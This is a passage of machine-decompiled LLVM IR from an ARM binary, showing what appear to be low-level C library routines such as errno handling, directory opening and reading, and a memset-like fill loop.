  %v1_1316c = sub i32 0, %v0_1316c
  store i32 %v1_1316c, i32* @r3, align 4
  %v2_13170 = inttoptr i32 %v0_13168 to i32*
  store i32 %v1_1316c, i32* %v2_13170, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13178.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13178

dec_label_pc_13178:                               ; preds = %dec_label_pc_1314c, %dec_label_pc_13168
  %v1_1317c = phi i32 [ %v0_13158, %dec_label_pc_1314c ], [ -1, %dec_label_pc_13168 ]
  %v2_13178 = phi i32 [ %v3_1314c, %dec_label_pc_1314c ], [ %v2_13178.pre, %dec_label_pc_13168 ]
  store i32 %v2_13178, i32* @r7, align 4
  ret i32 %v1_1317c

; uselistorder directives
  uselistorder i32 %v0_13158, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13178, { 1, 0 }
}

define i32 @function_13180(i32* %arg1) local_unnamed_addr {
dec_label_pc_13180:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13180 = load i32, i32* @r4, align 4
  store i32 %v3_13180, i32* %stack_var_-24, align 4
  %v9_13180 = load i32, i32* @r6, align 4
  %v12_13180 = load i32, i32* @r7, align 4
  %v15_13180 = load i32, i32* @r8, align 4
  %v18_13180 = load i32, i32* @lr, align 4
  %v2_13184 = load i32, i32* %arg1, align 4
  store i32 %v2_13184, i32* %r4.global-to-local, align 4
  %v3_1318c = icmp eq i32 %v2_13184, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 135344, i32* @r6, align 4
  br i1 %v3_1318c, label %dec_label_pc_131a0, label %dec_label_pc_131b4

dec_label_pc_131a0:                               ; preds = %dec_label_pc_13180
  %v0_131a0 = call i32 @function_13574()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_131a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_131a8, i32* %r2.global-to-local, align 4
  %v2_131ac = inttoptr i32 %v0_131a0 to i32*
  store i32 9, i32* %v2_131ac, align 4
  %v0_13254.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13254

dec_label_pc_131b4:                               ; preds = %dec_label_pc_13180
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_131b8 = add i32 %tmp, 24
  store i32 %v1_131b8, i32* %r4.global-to-local, align 4
  store i32 %v1_131b8, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_131cc = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_131cc)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_131e4 = load i32, i32* @r6, align 4
  %v2_131e4 = add i32 %v0_131e4, 16
  %v3_131e4 = inttoptr i32 %v2_131e4 to i32*
  %v4_131e4 = load i32, i32* %v3_131e4, align 4
  call void @__pseudo_branch(i32 %v4_131e4)
  %v0_131f0 = load i32, i32* @r7, align 4
  %v1_131f0 = inttoptr i32 %v0_131f0 to i32*
  %v2_131f0 = load i32, i32* %v1_131f0, align 4
  store i32 %v2_131f0, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_13200 = load i32, i32* @r8, align 4
  store i32 %v0_13200, i32* %v1_131f0, align 4
  %v0_13204 = load i32, i32* @r6, align 4
  %v1_13204 = load i32, i32* %r3.global-to-local, align 4
  %v2_13204 = add i32 %v1_13204, %v0_13204
  %v3_13204 = inttoptr i32 %v2_13204 to i32*
  %v4_13204 = load i32, i32* %v3_13204, align 4
  store i32 ptrtoint (i32* @global_var_13210.519 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13204)
  %v0_13210 = load i32, i32* @r7, align 4
  %v1_13210 = add i32 %v0_13210, 12
  %v2_13210 = inttoptr i32 %v1_13210 to i32*
  %v3_13210 = load i32, i32* %v2_13210, align 4
  store i32 %v3_13210, i32* @r0, align 4
  %v0_13214 = call i32 @function_14bf4()
  %v0_13218 = load i32, i32* @r7, align 4
  store i32 %v0_13218, i32* @r0, align 4
  %v0_1321c = call i32 @function_14bf4()
  %v0_13224 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_13224, -4095
  br i1 %tmp11, label %dec_label_pc_13250, label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %dec_label_pc_131b4
  %v0_13240 = call i32 @function_13574()
  %v0_13244 = load i32, i32* @r4, align 4
  %v1_13244 = sub i32 0, %v0_13244
  store i32 %v1_13244, i32* %r3.global-to-local, align 4
  %v2_13248 = inttoptr i32 %v0_13240 to i32*
  store i32 %v1_13244, i32* %v2_13248, align 4
  %v0_1324c = load i32, i32* @r8, align 4
  br label %dec_label_pc_13250

dec_label_pc_13250:                               ; preds = %dec_label_pc_131b4, %dec_label_pc_13240
  %v0_13250 = phi i32 [ %v0_13224, %dec_label_pc_131b4 ], [ %v0_1324c, %dec_label_pc_13240 ]
  store i32 %v0_13250, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13254

dec_label_pc_13254:                               ; preds = %dec_label_pc_131a0, %dec_label_pc_13250
  %v0_13254 = phi i32 [ %v0_13254.pre, %dec_label_pc_131a0 ], [ %v0_13250, %dec_label_pc_13250 ]
  %v2_1325c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1325c, i32* @r4, align 4
  store i32 %v9_13180, i32* @r6, align 4
  store i32 %v12_13180, i32* @r7, align 4
  store i32 %v15_13180, i32* @r8, align 4
  store i32 %v18_13180, i32* @lr, align 4
  ret i32 %v0_13254

; uselistorder directives
  uselistorder i32 %v0_13224, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_13254, { 1, 0 }
  uselistorder label %dec_label_pc_13250, { 1, 0 }
}

define i32 @function_13268(i32 %arg1) local_unnamed_addr {
dec_label_pc_13268:
  %v0_13268 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13268, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13268
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13268, %bb
  %v10_13274 = phi i32 [ %arg1, %dec_label_pc_13268 ], [ 0, %bb ]
  ret i32 %v10_13274

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13278(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13278:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_13278 = load i32, i32* @r5, align 4
  %v9_13278 = load i32, i32* @r6, align 4
  %v12_13278 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1328c = call i32 @function_13b88()
  %v2_13294 = icmp eq i32 %v0_1328c, 0
  store i32 135344, i32* @r6, align 4
  br i1 %v2_13294, label %bb, label %dec_label_pc_132a4

bb:                                               ; preds = %dec_label_pc_13278
  br label %dec_label_pc_13330

dec_label_pc_132a4:                               ; preds = %dec_label_pc_13278
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_132a8 = load i32, i32* @r4, align 4
  %v2_132a8 = icmp ugt i32 %v0_132a8, 511
  %v2_132ac = add i32 %v0_1328c, 4
  %v3_132ac = inttoptr i32 %v2_132ac to i32*
  store i32 0, i32* %v3_132ac, align 4
  %v0_132b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_132b0 = add i32 %v0_1328c, 16
  %v3_132b0 = inttoptr i32 %v2_132b0 to i32*
  store i32 %v0_132b0, i32* %v3_132b0, align 4
  %v0_132b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_132b4 = add i32 %v0_1328c, 8
  %v3_132b4 = inttoptr i32 %v2_132b4 to i32*
  store i32 %v0_132b4, i32* %v3_132b4, align 4
  br i1 %v2_132a8, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_132a4
  %v0_132bc2 = load i32, i32* @r4, align 4
  %v2_132bc3 = add i32 %v0_1328c, 20
  %v3_132bc4 = inttoptr i32 %v2_132bc3 to i32*
  store i32 %v0_132bc2, i32* %v3_132bc4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_132a4
  %v1_132b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_132b8 = add i32 %v1_132b8, 512
  store i32 %v2_132b8, i32* %r3.global-to-local, align 4
  %v0_132bc = load i32, i32* @r4, align 4
  %v2_132bc = add i32 %v0_1328c, 20
  %v3_132bc = inttoptr i32 %v2_132bc to i32*
  store i32 %v0_132bc, i32* %v3_132bc, align 4
  %v1_132c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_132c0, i32* %v3_132bc, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1328c, i32* @r5, align 4
  %v0_132c8 = load i32, i32* @r7, align 4
  %v2_132c8 = inttoptr i32 %v0_1328c to i32*
  store i32 %v0_132c8, i32* %v2_132c8, align 4
  %v0_132cc = load i32, i32* @r5, align 4
  %v1_132cc = add i32 %v0_132cc, 20
  %v2_132cc = inttoptr i32 %v1_132cc to i32*
  %v3_132cc = load i32, i32* %v2_132cc, align 4
  store i32 %v3_132cc, i32* %r1.global-to-local, align 4
  %v2_132d4 = call i32 @function_144a8(i32 1, i32 %v3_132cc)
  %v2_132d8 = icmp eq i32 %v2_132d4, 0
  store i32 %v2_132d4, i32* @r4, align 4
  %v1_132e0 = load i32, i32* @r5, align 4
  %v2_132e0 = add i32 %v1_132e0, 12
  %v3_132e0 = inttoptr i32 %v2_132e0 to i32*
  store i32 %v2_132d4, i32* %v3_132e0, align 4
  br i1 %v2_132d8, label %dec_label_pc_132e8, label %dec_label_pc_132f8

dec_label_pc_132e8:                               ; preds = %bb17
  %v0_132e8 = load i32, i32* @r5, align 4
  store i32 %v0_132e8, i32* @r0, align 4
  %v0_132ec = call i32 @function_14bf4()
  %v0_132f0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13330

dec_label_pc_132f8:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_13320 = load i32, i32* @r5, align 4
  %v1_13320 = add i32 %v0_13320, 24
  %v1_13324 = inttoptr i32 %v1_13320 to i32*
  store i32 0, i32* %v1_13324, align 4
  %v3_13324 = add i32 %v0_13320, 28
  %v4_13324 = inttoptr i32 %v3_13324 to i32*
  %v5_13324 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13324, i32* %v4_13324, align 4
  %v6_13324 = add i32 %v0_13320, 32
  %v7_13324 = inttoptr i32 %v6_13324 to i32*
  %v8_13324 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13324, i32* %v7_13324, align 4
  %v9_13324 = add i32 %v0_13320, 36
  %v10_13324 = inttoptr i32 %v9_13324 to i32*
  %v11_13324 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_13324, i32* %v10_13324, align 4
  %v12_13324 = add i32 %v0_13320, 40
  %v2_13328 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1332c = inttoptr i32 %v12_13324 to i32*
  store i32 %v2_13328, i32* %v1_1332c, align 4
  %v3_1332c = add i32 %v0_13320, 44
  %v4_1332c = inttoptr i32 %v3_1332c to i32*
  %v5_1332c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1332c, i32* %v4_1332c, align 4
  %v0_13330.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13330

dec_label_pc_13330:                               ; preds = %bb, %dec_label_pc_132e8, %dec_label_pc_132f8
  %v0_13330 = phi i32 [ 0, %bb ], [ %v0_132f0, %dec_label_pc_132e8 ], [ %v0_13330.pre, %dec_label_pc_132f8 ]
  store i32 %v6_13278, i32* @r5, align 4
  store i32 %v9_13278, i32* @r6, align 4
  store i32 %v12_13278, i32* @r7, align 4
  ret i32 %v0_13330

; uselistorder directives
  uselistorder i32 %v2_132d4, { 1, 0, 2 }
  uselistorder i32 %v0_1328c, { 2, 1, 4, 0, 5, 6, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 512, { 7, 4, 0, 1, 8, 5, 9, 6, 10, 2, 11, 3, 12 }
  uselistorder label %dec_label_pc_13330, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_13348(i32 %arg1) local_unnamed_addr {
dec_label_pc_13348:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v6_13348 = load i32, i32* @r7, align 4
  %v2_13350 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_13378, label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %dec_label_pc_13348
  %v0_13368 = call i32 @function_13574()
  %v0_1336c = load i32, i32* @r7, align 4
  %v1_1336c = sub i32 0, %v0_1336c
  %v2_13370 = inttoptr i32 %v0_13368 to i32*
  store i32 %v1_1336c, i32* %v2_13370, align 4
  br label %dec_label_pc_1339c

dec_label_pc_13378:                               ; preds = %dec_label_pc_13348
  %v1_13378 = icmp slt i32 %arg1, 0
  br i1 %v1_13378, label %dec_label_pc_1339c, label %dec_label_pc_13380

dec_label_pc_13380:                               ; preds = %dec_label_pc_13378
  store i32 %v2_13350, i32* @r1, align 4
  %v0_13384 = call i32 @function_160a4()
  %v1_13388 = icmp slt i32 %v0_13384, 0
  br i1 %v1_13388, label %dec_label_pc_13390, label %dec_label_pc_133a4

dec_label_pc_13390:                               ; preds = %dec_label_pc_13380
  br label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_13390, %dec_label_pc_13378, %dec_label_pc_13368
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_133e0

dec_label_pc_133a4:                               ; preds = %dec_label_pc_13380
  %v0_133ac = load i32, i32* @r7, align 4
  %v3_133b0 = call i32 @function_12fec(i32 %v0_133ac, i32 2, i32 1)
  %v0_133b4 = load i32, i32* @r7, align 4
  %v2_133bc = call i32 @function_13278(i32 %v0_133b4, i32 %tmp)
  store i32 %v2_133bc, i32* %r4.global-to-local, align 4
  %v2_133c0 = icmp eq i32 %v2_133bc, 0
  br i1 %v2_133c0, label %dec_label_pc_133c8, label %dec_label_pc_133e0

dec_label_pc_133c8:                               ; preds = %dec_label_pc_133a4
  %v0_133d4 = call i32 @function_13574()
  %v2_133dc = inttoptr i32 %v0_133d4 to i32*
  store i32 12, i32* %v2_133dc, align 4
  %v0_133e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_133e0

dec_label_pc_133e0:                               ; preds = %dec_label_pc_133a4, %dec_label_pc_1339c, %dec_label_pc_133c8
  %v0_133e0 = phi i32 [ %v2_133bc, %dec_label_pc_133a4 ], [ 0, %dec_label_pc_1339c ], [ %v0_133e0.pre, %dec_label_pc_133c8 ]
  store i32 %v6_13348, i32* @r7, align 4
  ret i32 %v0_133e0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_133e0, { 2, 0, 1 }
}

define i32 @function_133f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_133f0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_133f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133f0, label %bb, label %dec_label_pc_133f0._crit_edge

dec_label_pc_133f0._crit_edge:                    ; preds = %dec_label_pc_133f0
  br label %bb11

bb:                                               ; preds = %dec_label_pc_133f0
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_133f0._crit_edge, %bb
  %v2_133f8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_133f8, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13404 = call i32 @function_160a4()
  store i32 %v0_13404, i32* @r5, align 4
  %v2_13408 = icmp eq i32 %v0_13404, 0
  br i1 %v2_13408, label %dec_label_pc_13410, label %dec_label_pc_13478

dec_label_pc_13410:                               ; preds = %bb11
  %v1_13414 = and i32 %tmp5, 61440
  store i32 %v1_13414, i32* @r3, align 4
  %v7_13418 = icmp eq i32 %v1_13414, 16384
  br i1 %v7_13418, label %dec_label_pc_13430, label %dec_label_pc_13420

dec_label_pc_13420:                               ; preds = %dec_label_pc_13410
  %v0_13420 = call i32 @function_13574()
  br label %dec_label_pc_1345c

dec_label_pc_13430:                               ; preds = %dec_label_pc_13410
  %v0_13430 = load i32, i32* @r4, align 4
  %v2_13438 = call i32 @function_12f80(i32 %v0_13430, i32 3)
  %v7_1343c = icmp eq i32 %v2_13438, -1
  br i1 %v7_1343c, label %dec_label_pc_13478, label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %dec_label_pc_13430
  %v1_13444 = urem i32 %v2_13438, 4
  %v7_13448 = icmp eq i32 %v1_13444, 1
  br i1 %v7_13448, label %dec_label_pc_13450, label %dec_label_pc_13464

dec_label_pc_13450:                               ; preds = %dec_label_pc_13444
  %v0_13450 = call i32 @function_13574()
  br label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13420, %dec_label_pc_13450
  %storemerge2 = phi i32 [ %v0_13420, %dec_label_pc_13420 ], [ %v0_13450, %dec_label_pc_13450 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_13420 ], [ 22, %dec_label_pc_13450 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_1345c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1345c, align 4
  %v0_1347c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1347c

dec_label_pc_13464:                               ; preds = %dec_label_pc_13444
  %v0_13464 = load i32, i32* @r4, align 4
  %v2_1346c = call i32 @function_13278(i32 %v0_13464, i32 %tmp)
  store i32 %v2_1346c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1347c

dec_label_pc_13478:                               ; preds = %bb11, %dec_label_pc_13430
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1347c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_13464, %dec_label_pc_1345c, %dec_label_pc_13478
  %v0_1347c = phi i32 [ %v2_1346c, %dec_label_pc_13464 ], [ %v0_1347c.pre, %dec_label_pc_1345c ], [ 0, %dec_label_pc_13478 ]
  ret i32 %v0_1347c

; uselistorder directives
  uselistorder i32 %v2_13438, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_13278, { 1, 0 }
  uselistorder i32 ()* @function_160a4, { 1, 0 }
  uselistorder label %dec_label_pc_1347c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13478, { 1, 0 }
  uselistorder label %dec_label_pc_1345c, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_1348c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1348c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1348c = load i32, i32* @r4, align 4
  %v6_1348c = load i32, i32* @r5, align 4
  %v9_1348c = load i32, i32* @r6, align 4
  %v12_1348c = load i32, i32* @r7, align 4
  %v15_1348c = load i32, i32* @lr, align 4
  store i32 135344, i32* @r6, align 4
  %v1_134a0 = add i32 %tmp, 24
  store i32 %v1_134a0, i32* @r4, align 4
  %v4_134a4 = load i32, i32* inttoptr (i32 135380 to i32*), align 4
  store i32 %v4_134a4, i32* %r1.global-to-local, align 4
  store i32 %v1_134a0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_134b8 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_134b8)
  %v0_134cc = load i32, i32* @r6, align 4
  %v2_134cc = add i32 %v0_134cc, 16
  %v3_134cc = inttoptr i32 %v2_134cc to i32*
  %v4_134cc = load i32, i32* %v3_134cc, align 4
  store i32 %v4_134cc, i32* @ip, align 4
  store i32 79064, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_134cc)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_1350c, %dec_label_pc_1348c
  %v0_134dc = load i32, i32* @r5, align 4
  %v1_134dc = add i32 %v0_134dc, 4
  %v2_134dc = inttoptr i32 %v1_134dc to i32*
  %v3_134dc = load i32, i32* %v2_134dc, align 4
  store i32 %v3_134dc, i32* %r2.global-to-local, align 4
  %v4_134dc = add i32 %v0_134dc, 8
  %v5_134dc = inttoptr i32 %v4_134dc to i32*
  %v6_134dc = load i32, i32* %v5_134dc, align 4
  %tmp10 = icmp ugt i32 %v6_134dc, %v3_134dc
  br i1 %tmp10, label %dec_label_pc_1350c, label %dec_label_pc_134e8

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134dc
  %v1_134e8 = inttoptr i32 %v0_134dc to i32*
  %v2_134e8 = load i32, i32* %v1_134e8, align 4
  %v1_134ec = add i32 %v0_134dc, 12
  %v2_134ec = inttoptr i32 %v1_134ec to i32*
  %v3_134ec = load i32, i32* %v2_134ec, align 4
  store i32 %v3_134ec, i32* %r1.global-to-local, align 4
  %v1_134f0 = add i32 %v0_134dc, 20
  %v2_134f0 = inttoptr i32 %v1_134f0 to i32*
  %v3_134f0 = load i32, i32* %v2_134f0, align 4
  store i32 %v3_134f0, i32* %r2.global-to-local, align 4
  %v4_134f4 = call i32 @function_16010(i32 %v2_134e8, i32 %v3_134ec, i32 %v3_134f0, i32 %v6_134dc)
  %tmp9 = icmp slt i32 %v4_134f4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13504

.thread:                                          ; preds = %dec_label_pc_134e8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13538

dec_label_pc_13504:                               ; preds = %dec_label_pc_134e8
  %v1_13504 = load i32, i32* @r5, align 4
  %v2_13504 = add i32 %v1_13504, 8
  %v3_13504 = inttoptr i32 %v2_13504 to i32*
  store i32 %v4_134f4, i32* %v3_13504, align 4
  %v0_13508 = load i32, i32* @r7, align 4
  %v1_13508 = load i32, i32* @r5, align 4
  %v2_13508 = add i32 %v1_13508, 4
  %v3_13508 = inttoptr i32 %v2_13508 to i32*
  store i32 %v0_13508, i32* %v3_13508, align 4
  %v0_1350c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134dc, %dec_label_pc_13504
  %v1_1351c = phi i32 [ %v0_134dc, %dec_label_pc_134dc ], [ %v0_1350c.pre, %dec_label_pc_13504 ]
  %v1_1350c = add i32 %v1_1351c, 4
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  %v3_1350c = load i32, i32* %v2_1350c, align 4
  store i32 %v3_1350c, i32* %r2.global-to-local, align 4
  %v1_13510 = add i32 %v1_1351c, 12
  %v2_13510 = inttoptr i32 %v1_13510 to i32*
  %v3_13510 = load i32, i32* %v2_13510, align 4
  store i32 %v3_13510, i32* %r1.global-to-local, align 4
  %v2_13514 = add i32 %v3_13510, %v3_1350c
  store i32 %v2_13514, i32* @r4, align 4
  %v1_13518 = add i32 %v2_13514, 4
  %v2_13518 = inttoptr i32 %v1_13518 to i32*
  %v3_13518 = load i32, i32* %v2_13518, align 4
  %v2_1351c = add i32 %v1_1351c, 16
  %v3_1351c = inttoptr i32 %v2_1351c to i32*
  store i32 %v3_13518, i32* %v3_1351c, align 4
  %v0_13520 = load i32, i32* @r4, align 4
  %v1_13520 = add i32 %v0_13520, 8
  %v2_13520 = inttoptr i32 %v1_13520 to i16*
  %v3_13520 = load i16, i16* %v2_13520, align 2
  %v4_13520 = zext i16 %v3_13520 to i32
  %v0_13524 = load i32, i32* %r2.global-to-local, align 4
  %v1_13524 = load i32, i32* %r1.global-to-local, align 4
  %v2_13524 = add i32 %v1_13524, %v0_13524
  %v3_13524 = inttoptr i32 %v2_13524 to i32*
  %v4_13524 = load i32, i32* %v3_13524, align 4
  store i32 %v4_13524, i32* %r1.global-to-local, align 4
  %v2_13528 = add i32 %v0_13524, %v4_13520
  %v2_1352c = icmp eq i32 %v4_13524, 0
  %v1_13530 = load i32, i32* @r5, align 4
  %v2_13530 = add i32 %v1_13530, 4
  %v3_13530 = inttoptr i32 %v2_13530 to i32*
  store i32 %v2_13528, i32* %v3_13530, align 4
  br i1 %v2_1352c, label %dec_label_pc_134dc, label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %dec_label_pc_1350c, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13544 = load i32, i32* @r6, align 4
  %v2_13544 = add i32 %v0_13544, 24
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  %v4_13544 = load i32, i32* %v3_13544, align 4
  call void @__pseudo_branch(i32 %v4_13544)
  %v0_13550 = load i32, i32* @r4, align 4
  store i32 %v3_1348c, i32* @r4, align 4
  store i32 %v6_1348c, i32* @r5, align 4
  store i32 %v9_1348c, i32* @r6, align 4
  store i32 %v12_1348c, i32* @r7, align 4
  store i32 %v15_1348c, i32* @lr, align 4
  ret i32 %v0_13550

; uselistorder directives
  uselistorder i32 %v1_1351c, { 0, 2, 1 }
  uselistorder i32 %v6_134dc, { 1, 0 }
  uselistorder i32 %v0_134dc, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1350c, { 1, 0 }
}

define i32 @function_13564(i32 %arg1) local_unnamed_addr {
dec_label_pc_13564:
  %v0_13564 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13564, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13564
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13564, %bb
  %v10_13570 = phi i32 [ %arg1, %dec_label_pc_13564 ], [ 0, %bb ]
  ret i32 %v10_13570

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13574() local_unnamed_addr {
dec_label_pc_13574:
  store i32 add (i32 ptrtoint (i32* @global_var_db2c.535 to i32), i32 79236), i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_21380.537 to i32)
}

define i32 @function_13590(i32 %arg1) local_unnamed_addr {
dec_label_pc_13590:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_13594 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13594, i32* @r0, align 4
  %v1_1359c = call i32 @function_16480(i32 %v2_13594)
  %v2_135a0 = load i32, i32* %stack_var_-24, align 4
  %v2_135a4 = add i32 %v2_135a0, %tmp
  %v2_135ac = mul i32 %v2_135a4, 10000
  %v1_135b0 = and i32 %v2_135ac, 2147483632
  ret i32 %v1_135b0

; uselistorder directives
  uselistorder i32 %v2_13594, { 1, 0 }
}

define i32 @function_135d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_135d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_135d4 = load i32, i32* @r2, align 4
  %v8_135d4 = icmp eq i32 %v0_135d4, 8
  store i1 %v8_135d4, i1* %cpsr_z.global-to-local, align 1
  %v5_135d8 = icmp slt i32 %v0_135d4, 8
  br i1 %v5_135d8, label %dec_label_pc_13638, label %dec_label_pc_135dc

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135d0
  %v4_135dc = mul i32 %arg2, 256
  %v5_135dc = or i32 %v4_135dc, %arg2
  %v4_135e0 = mul i32 %v5_135dc, 65536
  %v5_135e0 = or i32 %v4_135e0, %v5_135dc
  store i32 %v5_135e0, i32* %r1.global-to-local, align 4
  %v1_135e457 = urem i32 %tmp, 4
  %v2_135e458 = icmp eq i32 %v1_135e457, 0
  store i1 %v2_135e458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_135e458, label %dec_label_pc_135f4, label %bb

bb:                                               ; preds = %dec_label_pc_135dc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_135dc ]
  %v3_135e859 = phi i32 [ %v6_135e8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_135dc ]
  %v4_135e8 = inttoptr i32 %v3_135e859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_135e8, align 1
  %v5_135e8 = load i32, i32* @r3, align 4
  %v6_135e8 = add i32 %v5_135e8, 1
  store i32 %v6_135e8, i32* @r3, align 4
  %v0_135ec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
